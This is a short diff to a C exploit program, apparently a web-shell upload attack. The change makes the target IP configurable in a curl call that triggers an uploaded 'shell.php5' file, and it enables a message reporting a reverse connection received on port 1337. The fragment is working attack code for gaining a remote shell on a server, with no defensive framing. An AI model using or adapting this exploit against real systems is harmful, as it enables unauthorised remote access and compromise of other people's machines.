@@ -288,7 +288,9 @@ send(sockhndl, request, strlen(request), 0);
 close(sockhndl);
 
 if (fork() == 0) {
-    system("curl -s http://10.49.187.152/uploads/shell.php5 >/dev/null 2>&1 &");
+    char curl_cmd[256];
+    snprintf(curl_cmd, sizeof(curl_cmd), "curl -s http://%s/uploads/shell.php5 >/dev/null 2>&1 &", target_ip);
+    system(curl_cmd);
     exit(0);
 }
 else{
@@ -327,7 +329,7 @@ if(shellhndl < 0){
 	return 1;
 }
 
-// printf("[+] Reverse connection received on port 1337..\n");
+ printf("[+] Reverse connection received on port 1337..\n");
 
 char buffer[1024];
 int bytes;
